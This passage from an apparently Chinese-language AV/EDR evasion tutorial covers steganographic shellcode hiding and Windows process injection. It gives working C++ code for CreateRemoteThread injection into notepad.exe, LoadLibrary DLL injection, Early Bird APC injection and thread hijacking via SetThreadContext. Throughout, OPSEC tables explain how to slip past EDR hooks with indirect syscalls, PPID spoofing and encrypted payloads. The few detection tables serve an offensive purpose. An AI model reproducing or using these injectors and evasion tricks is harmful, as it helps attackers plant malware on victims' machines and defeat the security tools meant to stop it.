<li><p>将Shellcode编码为<code>.bmp</code>或<code>.png</code>文件的最低有效位（LSB）。</p>
</li>
<li><p>在运行时使用解码器提取负载。</p>
</li>
<li><p>解码到内存，解密并如前所述执行。</p>
</li>
</ul>
<p>这种技术可以使用像<code>imgect</code>这样的工具，或使用<a target="_blank" rel="noopener" href="https://github.com/eboda/steghide">Python或C++中的隐写术库</a>自己实现。</p>
<hr>
<h3 id="7-最终操作安全性注意事项"><a href="#7-最终操作安全性注意事项" class="headerlink" title="7. 最终操作安全性注意事项"></a><strong>7. 最终操作安全性注意事项</strong></h3><ul>
<li><p>永远不要在内存中留下已解密的Shellcode，时间越长越危险。</p>
</li>
<li><p>使用<code>SecureZeroMemory</code>在使用后清除内存：</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">SecureZeroMemory</span>(exec, shellcode.<span class="hljs-built_in">size</span>());  <br></code></pre></td></tr></table></figure>

<ul>
<li>使用<code>Sleep(rand())</code>和垃圾代码随机化执行时间，增加隐蔽性。</li>
</ul>
<hr>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>通过混合编码、运行时解密以及使用降低熵的技巧，可以有效地绕过基于签名的检测机制和内存扫描器。这些技术使Shellcode在静态分析时看起来无害，并通过动态解密和执行来进一步避免检测。同时，结合PE节存储和隐写术等技巧，可以为攻击者提供更加隐蔽的操作路径。</p>
<h1 id="模块-6-–-工艺注入技术"><a href="#模块-6-–-工艺注入技术" class="headerlink" title="模块 6 – 工艺注入技术"></a>模块 6 – 工艺注入技术</h1><h2 id="AV-EDR规避实用技术-6-1-经典的CreateRemoteThread注入"><a href="#AV-EDR规避实用技术-6-1-经典的CreateRemoteThread注入" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 6.1 经典的CreateRemoteThread注入"></a>AV&#x2F;EDR规避实用技术 - 6.1 经典的CreateRemoteThread注入</h2><p><strong>目标：</strong>了解如何通过使用<code>WriteProcessMemory</code>和<code>CreateRemoteThread</code> API将有效载荷注入到远程进程中。</p>
<hr>
<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>此技术包括：</p>
<ol>
<li><p>打开目标进程的句柄。</p>
</li>
<li><p>在目标进程中分配内存。</p>
</li>
<li><p>将Shellcode写入该内存。</p>
</li>
<li><p>使用<code>CreateRemoteThread</code>来执行Shellcode。</p>
</li>
</ol>
<h4 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 示例：经典的远程线程注入</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">// 简单的Shellcode（示例MessageBox，必须替换为实际有效载荷）</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = &#123;<br>    <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-comment">// NOP sled</span><br>    <span class="hljs-comment">// 实际Shellcode将放在这里</span><br>&#125;;<br><br><span class="hljs-function">DWORD <span class="hljs-title">FindProcessId</span><span class="hljs-params">(<span class="hljs-type">const</span> std::wstring&amp; processName)</span> </span>&#123;<br>    PROCESSENTRY32 processInfo;<br>    processInfo.dwSize = <span class="hljs-built_in">sizeof</span>(processInfo);<br>    HANDLE processesSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (processesSnapshot == INVALID_HANDLE_VALUE) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">Process32First</span>(processesSnapshot, &amp;processInfo);<br>    <span class="hljs-keyword">if</span> (!processName.<span class="hljs-built_in">compare</span>(processInfo.szExeFile)) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(processesSnapshot);<br>        <span class="hljs-keyword">return</span> processInfo.th32ProcessID;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(processesSnapshot, &amp;processInfo)) &#123;<br>        <span class="hljs-keyword">if</span> (!processName.<span class="hljs-built_in">compare</span>(processInfo.szExeFile)) &#123;<br>            <span class="hljs-built_in">CloseHandle</span>(processesSnapshot);<br>            <span class="hljs-keyword">return</span> processInfo.th32ProcessID;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">CloseHandle</span>(processesSnapshot);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    DWORD pid = <span class="hljs-built_in">FindProcessId</span>(<span class="hljs-string">L&quot;notepad.exe&quot;</span>); <span class="hljs-comment">// 注入到Notepad</span><br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        std::wcerr &lt;&lt; <span class="hljs-string">L&quot;目标进程未找到。\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);<br>    <span class="hljs-keyword">if</span> (!hProcess) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;OpenProcess失败。\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    LPVOID remoteBuffer = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, remoteBuffer, shellcode, <span class="hljs-built_in">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>);<br>    HANDLE hThread = <span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-keyword">if</span> (hThread != <span class="hljs-literal">NULL</span>) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;远程线程创建成功。\n&quot;</span>;<br>        <span class="hljs-built_in">CloseHandle</span>(hThread);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;创建远程线程失败。\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="分步解析"><a href="#分步解析" class="headerlink" title="分步解析"></a>分步解析</h3><h4 id="步骤1：获取目标进程的句柄"><a href="#步骤1：获取目标进程的句柄" class="headerlink" title="步骤1：获取目标进程的句柄"></a><strong>步骤1：获取目标进程的句柄</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, targetPID);<br></code></pre></td></tr></table></figure>

<ul>
<li><p><code>PROCESS_ALL_ACCESS</code>授予完全访问权限（会被AV&#x2F;EDR监控）。</p>
</li>
<li><p>此调用<strong>会被记录</strong>，并且可能触发遥测事件。</p>
</li>
</ul>
<h4 id="步骤2：在目标进程中分配可执行内存"><a href="#步骤2：在目标进程中分配可执行内存" class="headerlink" title="步骤2：在目标进程中分配可执行内存"></a><strong>步骤2：在目标进程中分配可执行内存</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LPVOID remoteMemory = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br></code></pre></td></tr></table></figure>

<ul>
<li><p><code>PAGE_EXECUTE_READWRITE</code>是<strong>红旗</strong>。现代AV&#x2F;EDR会检测具有RWX权限的内存。</p>
</li>
<li><p>先使用<code>PAGE_READWRITE</code>，然后再用<code>VirtualProtectEx</code>将其更改为<code>PAGE_EXECUTE_READ</code>。</p>
</li>
</ul>
<h4 id="步骤3：将Shellcode写入分配的内存"><a href="#步骤3：将Shellcode写入分配的内存" class="headerlink" title="步骤3：将Shellcode写入分配的内存"></a><strong>步骤3：将Shellcode写入分配的内存</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">WriteProcessMemory</span>(hProcess, remoteMemory, shellcode, payloadSize, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>监控的API</strong>：用户空间和&#x2F;或内核会跟踪写入其他进程的内存。</li>
</ul>
<h4 id="步骤4：使用CreateRemoteThread执行Shellcode"><a href="#步骤4：使用CreateRemoteThread执行Shellcode" class="headerlink" title="步骤4：使用CreateRemoteThread执行Shellcode"></a><strong>步骤4：使用CreateRemoteThread执行Shellcode</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HANDLE hThread = <span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)remoteMemory, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>

<ul>
<li><p>这会触发一个实时的<strong>线程创建事件</strong>，很容易被EDR检测到。</p>
</li>
<li><p>目标进程会显示一个新的线程，该线程的起始地址是一个<strong>没有映射的内存地址</strong>，触发警报。</p>
</li>
</ul>
<hr>
<h3 id="检测向量（EDR检测到什么）"><a href="#检测向量（EDR检测到什么）" class="headerlink" title="检测向量（EDR检测到什么）"></a>检测向量（EDR检测到什么）</h3><table>
<thead>
<tr>
<th>操作</th>
<th>检测机制</th>
</tr>
</thead>
<tbody><tr>
<td>OpenProcess</td>
<td>访问另一个进程</td>
</tr>
<tr>
<td>VirtualAllocEx</td>
<td>远程进程中的RWX内存</td>
</tr>
<tr>
<td>WriteProcessMemory</td>
<td>代码注入特征</td>
</tr>
<tr>
<td>CreateRemoteThread</td>
<td>可疑线程创建</td>
</tr>
<tr>
<td>非模块地址起始</td>
<td>线程未指向模块</td>
</tr>
</tbody></table>
<p>现代EDR<strong>挂钩这些API</strong>或使用<strong>内核回调</strong>来追踪这些行为。</p>
<hr>
<h3 id="实际示例"><a href="#实际示例" class="headerlink" title="实际示例"></a>实际示例</h3><p>许多商用RAT（例如<code>njRAT</code>、<code>DarkComet</code>、<code>AgentTesla</code>）使用此方法将C2有效载荷注入到合法进程（例如<code>explorer.exe</code>、<code>svchost.exe</code>、<code>notepad.exe</code>）中，以<strong>隐藏进程可见性</strong>。</p>
<p>然而，由于它的普遍性，这种方法<strong>高度签名化且易于预测</strong>。</p>
<hr>
<h3 id="OPSEC改进（低检测增强）"><a href="#OPSEC改进（低检测增强）" class="headerlink" title="OPSEC改进（低检测增强）"></a>OPSEC改进（低检测增强）</h3><table>
<thead>
<tr>
<th>技巧</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>使用<code>PAGE_READWRITE</code></td>
<td>将内存分配为RW，然后使用<code>VirtualProtectEx</code>更改为EXECUTE</td>
</tr>
<tr>
<td><code>NtCreateThreadEx</code></td>
<td>不太常见的系统调用，更难检测</td>
</tr>
<tr>
<td>手动映射Shellcode</td>
<td>避免使用<code>WriteProcessMemory</code>，使用本地映射和<code>NtMapViewOfSection</code></td>
</tr>
<tr>
<td>编码&#x2F;加密Shellcode</td>
<td>使用XOR&#x2F;RC4&#x2F;AES等方法来模糊签名</td>
</tr>
<tr>
<td>线程隐匿</td>
<td>使用<code>SetThreadInformation</code>隐藏线程以防调试器</td>
</tr>
<tr>
<td>PPID伪造</td>
<td>伪造父进程ID，使其看起来像是一个受信任的进程</td>
</tr>
<tr>
<td>延迟执行</td>
<td>使用<code>Sleep</code>延迟，反分析定时器逻辑</td>
</tr>
<tr>
<td>间接系统调用</td>
<td>使用syswhispers或hellsgate等工具避免用户态钩子</td>
</tr>
</tbody></table>
<hr>
<h3 id="无内存变体：LoadLibrary有效载荷"><a href="#无内存变体：LoadLibrary有效载荷" class="headerlink" title="无内存变体：LoadLibrary有效载荷"></a>无内存变体：LoadLibrary有效载荷</h3><p>将Shellcode注入的替代方法是通过<code>LoadLibraryA</code>远程加载DLL：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">char</span> dllPath[] = <span class="hljs-string">&quot;C:\\temp\\evil.dll&quot;</span>;<br>LPVOID remoteStr = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-built_in">strlen</span>(dllPath) + <span class="hljs-number">1</span>, MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-built_in">WriteProcessMemory</span>(hProcess, remoteStr, dllPath, <span class="hljs-built_in">strlen</span>(dllPath) + <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteStr, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>

<ul>
<li><p>这种方法<strong>更容易被检测到</strong>（DLL加载会被记录并且签名化）。</p>
</li>
<li><p>如果DLL使用隐蔽技术（例如，延迟加载Shellcode），仍然有用。</p>
</li>
</ul>
<h2 id="AV-EDR规避实用技术-6-2-早鸟注入（高级进程注入技术）"><a href="#AV-EDR规避实用技术-6-2-早鸟注入（高级进程注入技术）" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 6.2 - 早鸟注入（高级进程注入技术）"></a>AV&#x2F;EDR规避实用技术 - 6.2 - 早鸟注入（高级进程注入技术）</h2><h3 id="概念概述"><a href="#概念概述" class="headerlink" title="概念概述"></a><strong>概念概述</strong></h3><p><strong>早鸟注入</strong>是一种更加隐蔽的进程注入技术，针对的是<strong>远程进程执行的非常早期阶段</strong>，即在主入口点到达之前。其原理是在进程恢复之前将线程排入队列，从而让有效载荷在<strong>原始进程逻辑启动之前</strong>就开始执行。</p>
<p>这种技术减少了EDR检测的机会，因为<strong>用户态钩子通常在此早期执行阶段尚未完全初始化</strong>。</p>
<hr>
<h3 id="工作流概述"><a href="#工作流概述" class="headerlink" title="工作流概述"></a><strong>工作流概述</strong></h3><ol>
<li><p>在<strong>挂起状态</strong>下创建目标进程</p>
</li>
<li><p>在目标进程中分配内存</p>
</li>
<li><p>将Shellcode写入内存</p>
</li>
<li><p>使用**<code>QueueUserAPC()</code>**将线程排队到Shellcode</p>
</li>
<li><p>恢复主线程 → Shellcode通过APC队列执行</p>
</li>
</ol>
<hr>
<h3 id="详细步骤与C-代码（已注释）"><a href="#详细步骤与C-代码（已注释）" class="headerlink" title="详细步骤与C++代码（已注释）"></a><strong>详细步骤与C++代码（已注释）</strong></h3><h4 id="1-创建挂起的进程"><a href="#1-创建挂起的进程" class="headerlink" title="1. 创建挂起的进程"></a><strong>1. 创建挂起的进程</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp">STARTUPINFOA si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>si.cb = <span class="hljs-built_in">sizeof</span>(si);<br><br><span class="hljs-built_in">CreateProcessA</span>(<br>    <span class="hljs-string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>,  <span class="hljs-comment">// 目标二进制文件</span><br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    FALSE,<br>    CREATE_SUSPENDED,  <span class="hljs-comment">// 重要：保持挂起</span><br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    &amp;si,<br>    &amp;pi<br>);<br></code></pre></td></tr></table></figure>

<ul>
<li><code>CREATE_SUSPENDED</code>确保主线程尚未运行。</li>
</ul>
<hr>
<h4 id="2-在目标进程中分配内存"><a href="#2-在目标进程中分配内存" class="headerlink" title="2. 在目标进程中分配内存"></a><strong>2. 在目标进程中分配内存</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LPVOID remoteMemory = <span class="hljs-built_in">VirtualAllocEx</span>(<br>    pi.hProcess,<br>    <span class="hljs-literal">NULL</span>,<br>    shellcodeSize,<br>    MEM_COMMIT | MEM_RESERVE,<br>    PAGE_EXECUTE_READWRITE  <span class="hljs-comment">// 暂时设置为RWX</span><br>);<br></code></pre></td></tr></table></figure>

<ul>
<li>可以使用<code>PAGE_READWRITE</code>，然后稍后调用<code>VirtualProtectEx</code>更改为执行权限（以提高OPSEC）。</li>
</ul>
<hr>
<h4 id="3-写入Shellcode"><a href="#3-写入Shellcode" class="headerlink" title="3. 写入Shellcode"></a><strong>3. 写入Shellcode</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">WriteProcessMemory</span>(pi.hProcess, remoteMemory, shellcode, shellcodeSize, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>

<ul>
<li>将你的已编码或已解密的Shellcode写入目标进程。</li>
</ul>
<hr>
<h4 id="4-通过APC队列Shellcode"><a href="#4-通过APC队列Shellcode" class="headerlink" title="4. 通过APC队列Shellcode"></a><strong>4. 通过APC队列Shellcode</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">QueueUserAPC</span>(<br>    (PAPCFUNC)remoteMemory,  <span class="hljs-comment">// 要调用的地址</span><br>    pi.hThread,              <span class="hljs-comment">// 接收APC的线程</span><br>    <span class="hljs-literal">NULL</span>                     <span class="hljs-comment">// 可选的参数</span><br>);<br></code></pre></td></tr></table></figure>

<ul>
<li>APC将<strong>不会执行</strong>，直到线程<strong>进入可警报状态</strong>（这发生在从挂起状态恢复时）。</li>
</ul>
<hr>
<h4 id="5-恢复执行（触发APC队列）"><a href="#5-恢复执行（触发APC队列）" class="headerlink" title="5. 恢复执行（触发APC队列）"></a><strong>5. 恢复执行（触发APC队列）</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ResumeThread</span>(pi.hThread);<br></code></pre></td></tr></table></figure>

<ul>
<li>当线程恢复时，Shellcode会在<strong>主入口点之前</strong>执行。</li>
</ul>
<hr>
<h3 id="为什么这能绕过EDR"><a href="#为什么这能绕过EDR" class="headerlink" title="为什么这能绕过EDR"></a><strong>为什么这能绕过EDR</strong></h3><table>
<thead>
<tr>
<th>EDR组件</th>
<th>绕过原因</th>
</tr>
</thead>
<tbody><tr>
<td>用户态API钩子</td>
<td>在早期线程状态下，钩子尚未加载或激活</td>
</tr>
<tr>
<td>系统调用遥测</td>
<td>线程创建阶段，系统调用优先级较低</td>
</tr>
<tr>
<td>签名检测</td>
<td>没有DLL注入或典型的行为</td>
</tr>
<tr>
<td>行为引擎</td>
<td>时间技巧避开启发式触发</td>
</tr>
</tbody></table>
<hr>
<h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a><strong>实际应用</strong></h3><p>APT攻击组和高级恶意软件（如Cobalt Strike变种、TrickBot模块）使用此方法<strong>注入到svchost.exe、notepad.exe或explorer.exe等服务中</strong>，以避免AV&#x2F;EDR的检测。</p>
<p>此技术在“无文件恶意软件”载荷中得到了武器化，恶意软件的持久性并不依赖于磁盘，而是在内存阶段通过这种注入方式执行。</p>
<hr>
<h3 id="检测与局限性"><a href="#检测与局限性" class="headerlink" title="检测与局限性"></a><strong>检测与局限性</strong></h3><table>
<thead>
<tr>
<th>指标</th>
<th>可能的检测方法</th>
</tr>
</thead>
<tbody><tr>
<td>挂起进程中的RWX内存</td>
<td>内存扫描器 &#x2F; Yara规则触发</td>
</tr>
<tr>
<td>将QueueUserAPC排队到远程线程</td>
<td>在挂起线程中，APC的行为可疑</td>
</tr>
<tr>
<td>非标准入口点调用</td>
<td>线程上下文行为异常</td>
</tr>
</tbody></table>
<p>现代EDR（如SentinelOne、CrowdStrike）使用<strong>线程栈检查</strong>和<strong>内存分析</strong>来标记这些注入，如果使用不当，容易被发现。</p>
<hr>
<h3 id="OPSEC建议"><a href="#OPSEC建议" class="headerlink" title="OPSEC建议"></a><strong>OPSEC建议</strong></h3><table>
<thead>
<tr>
<th>技巧</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>编码Shellcode</td>
<td>使用XOR、RC4、AES等加密方式</td>
</tr>
<tr>
<td>仅将内存分配为RW</td>
<td>然后使用<code>VirtualProtectEx</code>将其更改为EXEC</td>
</tr>
<tr>
<td>排队多个APC</td>
<td>生成噪音或进行误导</td>
</tr>
<tr>
<td>使用间接系统调用</td>
<td>避免用户态EDR钩子</td>
</tr>
<tr>
<td>如果是自注入，清理PE头部</td>
<td>防止内存扫描器检测到PE头部</td>
</tr>
</tbody></table>
<hr>
<h3 id="示例代码：-1"><a href="#示例代码：-1" class="headerlink" title="示例代码："></a><strong>示例代码：</strong></h3><p>如果需要，我可以提供：</p>
<ul>
<li><p>一个生成<code>calc.exe</code>的Shellcode示例</p>
</li>
<li><p>完整工作的早鸟注入器（C++）</p>
</li>
<li><p>使用<strong>间接系统调用</strong>版本的<code>VirtualAllocEx</code>和<code>WriteProcessMemory</code></p>
</li>
</ul>
<h2 id="AV-EDR规避实用技术-6-3-线程劫持（远程线程上下文操控）"><a href="#AV-EDR规避实用技术-6-3-线程劫持（远程线程上下文操控）" class="headerlink" title="AV&#x2F;EDR规避实用技术 - 6.3 - 线程劫持（远程线程上下文操控）"></a>AV&#x2F;EDR规避实用技术 - 6.3 - 线程劫持（远程线程上下文操控）</h2><h3 id="概念概述-1"><a href="#概念概述-1" class="headerlink" title="概念概述"></a><strong>概念概述</strong></h3><p><strong>线程劫持</strong>是一种强大的进程注入技术，攻击者<strong>修改</strong>远程进程中现有线程的<strong>执行上下文</strong>，将其重定向到有效载荷（例如Shellcode）。与<code>CreateRemoteThread</code>不同，线程劫持技术<strong>不创建新线程</strong>，因此更隐蔽，难以检测。</p>
<p>此方法通常包括以下步骤：</p>
<ul>
<li><p>暂停线程</p>
</li>
<li><p>修改其上下文（<code>EIP/RIP</code>），使其指向Shellcode</p>
</li>
<li><p>恢复线程</p>
</li>
</ul>
<hr>
<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a><strong>使用场景</strong></h3><ul>
<li><p>在创建新线程会引发警报时进行隐蔽注入。</p>
</li>
<li><p>AV&#x2F;EDR通常监控<code>CreateRemoteThread</code>，但并不总是监控<code>SetThreadContext</code>。</p>
</li>
</ul>
<hr>
<h3 id="C-实现的步骤"><a href="#C-实现的步骤" class="headerlink" title="C++实现的步骤"></a><strong>C++实现的步骤</strong></h3><p>我们将通过线程劫持注入Shellcode到**<code>notepad.exe</code>**。</p>
<hr>
<h4 id="1-打开目标进程和线程"><a href="#1-打开目标进程和线程" class="headerlink" title="1. 打开目标进程和线程"></a><strong>1. 打开目标进程和线程</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DWORD pid = <span class="hljs-built_in">FindProcessId</span>(<span class="hljs-string">&quot;notepad.exe&quot;</span>); <span class="hljs-comment">// 实现自己的FindProcessId函数</span><br>HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);<br></code></pre></td></tr></table></figure>

<ul>
<li>如果需要，确保提升权限（<code>SeDebugPrivilege</code>）。</li>
</ul>
<hr>
<h4 id="2-查找目标进程中的线程"><a href="#2-查找目标进程中的线程" class="headerlink" title="2. 查找目标进程中的线程"></a><strong>2. 查找目标进程中的线程</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DWORD tid = <span class="hljs-built_in">FindThreadId</span>(pid); <span class="hljs-comment">// 实现查找线程的逻辑</span><br>HANDLE hThread = <span class="hljs-built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, tid);<br></code></pre></td></tr></table></figure>

<ul>
<li>确保该线程不是<strong>关键线程</strong>（如系统线程），否则可能会导致进程崩溃。</li>
</ul>
<hr>
<h4 id="3-暂停线程并分配内存"><a href="#3-暂停线程并分配内存" class="headerlink" title="3. 暂停线程并分配内存"></a><strong>3. 暂停线程并分配内存</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">SuspendThread</span>(hThread);<br><br>LPVOID remoteShellcode = <span class="hljs-built_in">VirtualAllocEx</span>(<br>    hProcess,<br>    <span class="hljs-literal">NULL</span>,<br>    shellcodeSize,<br>    MEM_COMMIT | MEM_RESERVE,<br>    PAGE_EXECUTE_READWRITE<br>);<br><br><span class="hljs-built_in">WriteProcessMemory</span>(hProcess, remoteShellcode, shellcode, shellcodeSize, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="4-获取并修改线程上下文"><a href="#4-获取并修改线程上下文" class="headerlink" title="4. 获取并修改线程上下文"></a><strong>4. 获取并修改线程上下文</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">CONTEXT ctx;<br>ctx.ContextFlags = CONTEXT_FULL;<br><br><span class="hljs-built_in">GetThreadContext</span>(hThread, &amp;ctx);<br><br><span class="hljs-comment">// 在x64系统上，使用Rip代替Eip</span><br>ctx.Rip = (DWORD64)remoteShellcode;<br><br><span class="hljs-built_in">SetThreadContext</span>(hThread, &amp;ctx);<br></code></pre></td></tr></table></figure>

<ul>
<li>通过修改<code>Rip</code>，你将执行重定向到Shellcode。</li>
</ul>
<hr>
